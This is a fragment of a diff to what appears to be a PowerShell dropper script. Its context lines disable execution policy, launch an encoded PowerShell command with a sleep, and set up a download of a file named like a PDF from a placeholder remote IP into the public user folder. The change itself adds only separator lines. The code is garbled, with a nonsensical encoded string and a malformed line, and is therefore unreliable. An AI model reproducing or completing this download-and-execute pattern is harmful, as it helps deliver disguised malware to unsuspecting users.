@@ -38,6 +38,8 @@ Disable-ExecutionPolicy
 
 powershell -noexit -enc erwerwer : start-sleep -s 5 HOMERO
 
+------------
+-----------------
 2-
 $LINK = "IP/DOG.PDF"
 $DESTINO = "c:\users\public\dog.pdf"
